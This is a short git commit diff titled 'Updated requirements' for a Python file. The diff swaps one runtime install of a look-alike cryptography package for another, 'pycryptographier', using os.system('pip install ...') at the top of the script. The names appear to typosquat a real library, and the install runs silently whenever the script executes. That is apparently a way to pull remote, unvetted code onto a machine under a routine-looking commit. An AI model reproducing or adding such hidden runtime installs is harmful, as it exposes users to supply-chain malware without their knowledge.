3b695fb29809dda1a2f9e8db7b41d0a54872f6d9
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-12 21:12:00 +0200

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptography")
-import pycryptography
+os.system("pip install pycryptographier")
+import pycryptographier
 from optparse import Option
 import requests
 import threading
